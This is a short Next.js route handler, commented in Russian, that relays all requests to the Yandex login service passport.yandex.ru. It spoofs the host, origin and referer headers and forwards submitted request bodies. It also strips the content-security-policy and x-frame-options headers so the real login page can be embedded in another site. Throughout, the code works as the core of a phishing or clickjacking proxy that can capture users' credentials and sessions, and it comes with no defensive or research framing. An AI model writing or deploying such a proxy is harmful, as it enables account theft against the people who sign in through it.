const TARGET = "https://passport.yandex.ru";

export async function GET(req, { params }) {
  return proxy(req, params);
}

export async function POST(req, { params }) {
  return proxy(req, params);
}

async function proxy(req, params) {
  const path = params.path?.join("/") || "";

  const url =
    `${TARGET}/${path}` +
    (req.nextUrl.search || "");

  // копируем headers
  const headers = new Headers(req.headers);

  headers.set(
    "host",
    "passport.yandex.ru"
  );

  headers.set(
    "origin",
    "https://passport.yandex.ru"
  );

  headers.set(
    "referer",
    "https://passport.yandex.ru/"
  );

  // body
  let body = undefined;

  if (req.method !== "GET" && req.method !== "HEAD") {
    body = await req.arrayBuffer();
  }

  const res = await fetch(url, {
    method: req.method,
    headers,
    body,
  });

  // читаем ответ
  const buffer = await res.arrayBuffer();

  // копируем response headers
  const responseHeaders = new Headers(res.headers);

  // убираем защиту iframe/csp
  responseHeaders.delete("content-security-policy");
  responseHeaders.delete("x-frame-options");

  return new Response(buffer, {
    status: res.status,
    headers: responseHeaders
  });
}